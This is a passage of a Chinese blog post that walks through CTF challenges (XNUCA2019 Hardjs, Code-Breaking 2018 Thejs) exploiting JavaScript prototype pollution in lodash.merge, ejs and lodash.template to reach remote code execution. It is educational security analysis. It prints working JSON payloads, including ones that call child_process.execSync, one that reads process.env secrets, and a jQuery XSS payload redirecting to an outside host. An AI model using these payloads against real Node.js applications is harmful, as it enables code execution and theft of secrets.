|| _DEFAULT_CLOSE_DELIMITER;</span><br><span class="line">  options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;</span><br><span class="line">  options.strict = opts.strict || <span class="literal">false</span>;</span><br><span class="line">  options.context = opts.context;</span><br><span class="line">  options.cache = opts.cache || <span class="literal">false</span>;</span><br><span class="line">  options.rmWhitespace = opts.rmWhitespace;</span><br><span class="line">  options.root = opts.root;</span><br><span class="line">  options.outputFunctionName = opts.outputFunctionName;</span><br><span class="line">  options.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;</span><br><span class="line">  options.views = opts.views;</span><br><span class="line">  options.async = opts.async;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可以看到，这些变量来自于对象<code>opt</code>，并且这些变量一开始在<code>Object</code>中都为空。所以我们就可以通过对这些变量逐一跟踪，看看哪个拼接到了模板中，那么我们就可以通过污染这些变量，渲染过程由于存在<strong>eval</strong>，从而进行RCE</p>
<p>例如我们可以跟踪一条：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;</span><br></pre></td></tr></table></figure>

<p>然后跟踪到了<strong>Template</strong>的原型中的方法：<strong>compile</strong>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">var</span> escapeFn = opts.escapeFunction;</span><br></pre></td></tr></table></figure>

<p>此时<code>opts.escapeFunction</code>赋值给了变量<code>escapeFn</code>，继续跟踪<code>escapeFn</code>，同样在<strong>compile</strong>找到了这一段代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.client) &#123;</span><br><span class="line">      src = <span class="string">'escapeFn = escapeFn || '</span> + escapeFn.toString() + <span class="string">';'</span> + <span class="string">'\n'</span> + src;</span><br><span class="line">      <span class="keyword">if</span> (opts.compileDebug) &#123;</span><br><span class="line">        src = <span class="string">'rethrow = rethrow || '</span> + rethrow.toString() + <span class="string">';'</span> + <span class="string">'\n'</span> + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到如果<code>opts.client</code>存在，则将<code>escapeFn</code>拼接到<code>src</code>中</p>
<p>然后根据拼接的内容，生成动态函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    ctor = <span class="built_in">Function</span>;</span><br><span class="line">&#125;</span><br><span class="line">fn = <span class="keyword">new</span> ctor(opts.localsName + <span class="string">', escapeFn, include, rethrow'</span>, src);</span><br></pre></td></tr></table></figure>

<p>所以，我们如果可以控制<code>opts.escapeFunction</code>的内容为恶意代码，即可通过ejs模板渲染进行RCE</p>
<p>构造恶意代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"constructor"</span>:&#123;<span class="string">"prototype"</span>:&#123;<span class="string">"client"</span>:<span class="literal">true</span>,<span class="string">"escapeFunction"</span>:<span class="string">"1; return process.env.FLAG"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后通过<code>/add</code>将json格式的payload传递给服务器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;notice&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return process.env.FLAG&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/js-prototype-pollution/6.png" alt=""></p>
<p>同样的payload打6次，6次的原因是记录数大于5才会执行合并，看<code>/get</code>路由中的代码就明白了：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>);</span><br></pre></td></tr></table></figure>

<p>然后随便访问一个带有<code>app.render()</code>渲染代码的路由，进行模板渲染即可getflag</p>
<p><img src="../../../../img/js-prototype-pollution/7.png" alt=""></p>
<p>我们再跟踪一下另外一个变量<code>outputFuncationName</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">options.outputFunctionName = opts.outputFunctionName;</span><br></pre></td></tr></table></figure>

<p>还是跟踪到了<strong>compile</strong>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.source) &#123;</span><br><span class="line">    <span class="keyword">this</span>.generateSource();</span><br><span class="line">    prepended += <span class="string">'  var __output = [], __append = __output.push.bind(__output);'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">'  var '</span> + opts.outputFunctionName + <span class="string">' = __append;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">this</span>.source = prepended + <span class="keyword">this</span>.source + appended;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>this.source</code>不存在，则执行<code>prepended += &#39;  var &#39; + opts.outputFunctionName + &#39; = __append;&#39; + &#39;\n&#39;;</code>，将<code>opts.outputFunctionName</code>拼接到变量<code>prepended</code>中，然后末尾又将<code>prepended</code>拼接到<code>this.source</code></p>
<p>继续跟踪<code>this.source</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.compileDebug) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    src = <span class="keyword">this</span>.source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>opts.compileDebug</code>不存在，则将<code>this.source</code>赋值给<code>src</code></p>
<p>最后还是带入了<code>fn = new ctor(opts.localsName + &#39;, escapeFn, include, rethrow&#39;, src);</code>动态函数</p>
<p>同样构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;notice&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return process.env.FLAG//&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>打6次然后访问<code>/</code>触发原型链污染，即可getflag</p>
<h3 id="前端XSS"><a href="#前端XSS" class="headerlink" title="前端XSS"></a>前端XSS</h3><p>还有一种是利用<strong>app.js</strong>中的代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ;i&lt;datas.length; i++)&#123;</span><br><span class="line">    $.extend(<span class="literal">true</span>,allNode,datas[i])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Jquery原型链污染漏洞进行XSS，官方payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;test&quot;,&quot;content&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;logger&quot;: &quot;&lt;script&gt;window.location=&apos;http://wonderkun.cc/hack.html&apos;&lt;/script&gt;&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里还不是很理解原理，等理解再补上吧</p>
<h2 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h2><p>源码：<a href="https://github.com/phith0n/code-breaking/tree/master/2018/thejs" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/tree/master/2018/thejs</a> </p>
<p>源码很简单，只有一个<strong>server.js</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; </span><br><span class="line"><span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>使用<code>lodash</code>来实现<strong>ejs</strong>模板引擎渲染</p>
<p><code>lodash</code>是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p>
<ol>
<li><code>lodash.template</code> 一个简单的模板引擎</li>
<li><code>lodash.merge</code> 函数或对象的合并</li>
</ol>
<p>看到<code>merge</code>就可以想到之前分析的原型链污染的触发点，因为这是一个<strong>express</strong>框架，支持Json直接传输数据，并且接收的参数为<code>req.body</code>，所以我们可以直接构造payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;&quot;:&quot;&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>传入后通过<code>lodash.merge</code>进行原型链污染，修改<code>Object</code>的属性，然后通过<code>lodash.template</code>渲染到模板，所以现在我们只需要找到可以触发RCE的点，目光就放在<code>lodash.template</code>的后端代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a> </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以发现<code>options</code>对象的<code>sourceURL</code>属性，被直接传入到了<code>Function</code>中，那么，我们就可以污染<code>Object.sourceURL</code>来改变<code>options.sourceURL</code>，然后传入到函数中进行代码执行</p>
<p>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\r\nreturn e =&gt;&#123;return global.process.mainModule.require(&apos;child_process&apos;).execSync(&apos;id&apos;);&#125;&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/js-prototype-pollution/8.png" alt=""></p>
<p><img src="../../../../img/js-prototype-pollution/9.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于JS原型和原型链可以总结为以下五点：</p>
<ul>
<li>所有的引用类型（数组、函数、对象）可以自由扩展属性（除null以外）</li>
<li>所有的引用类型都有一个<code>__proto__</code>属性（也叫隐式属性，它是一个普通的对象）</li>
<li>所有的函数都有一个<code>prototype</code>属性，（也叫显式属性，它也是一个普通的对象）</li>
<li>所有引用类型，它的<code>__proto__</code>属性指向它的构造函数的<code>prototype</code>属性</li>
<li>当试图得到一个对象属性时，如果这个对象本身不存在这个属性，会从它的构造函数的<code>prototype</code>属性中去寻找</li>
</ul>
<p>原型链污染的步骤总结如下：</p>
<ul>
<li><code>Object</code>中不存在或初始值为null的属性，这个属性就可能成为污染的对象</li>
<li>找到可以修改<code>__proto__</code>的点，即原型链污染的触发点，最常见的就是实现<code>merge</code>数组键名合并功能的函数，例如<code>lodash.merge</code>和<strong>ejs</strong>引擎的模板渲染</li>
<li>污染的最终目的就是让污染的代码执行RCE，例如<strong>ejs</strong>引擎具有<code>eval</code>的操作，或者<code>lodash.template</code>会将<code>options.sourceURL</code>作为参数传入函数执行</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击</a></p>
<p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">XNUCA2019 Hardjs题解 从原型链污染到RCE</a></p>
<p><a href="http://www.heetian.com/info/574" target="_blank" rel="noopener">JavaScript Prototype污染攻击</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JavaScript-prototype-pollution/">JavaScript-prototype-pollution</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/11/30/2019%E5%AE%89%E8%AF%A2%E6%9D%AF-Web/"><i class="fa fa-chevron-left">  </i><span>2019 安洵杯Web部分题解WriteUp</span></a></div><div class="next-post pull-right"><a href="/2019/11/26/D%5E3ctf-Web/"><span>2019 D^3 CTF-Web部分复现记录</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
  placeholder:'Just go go',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>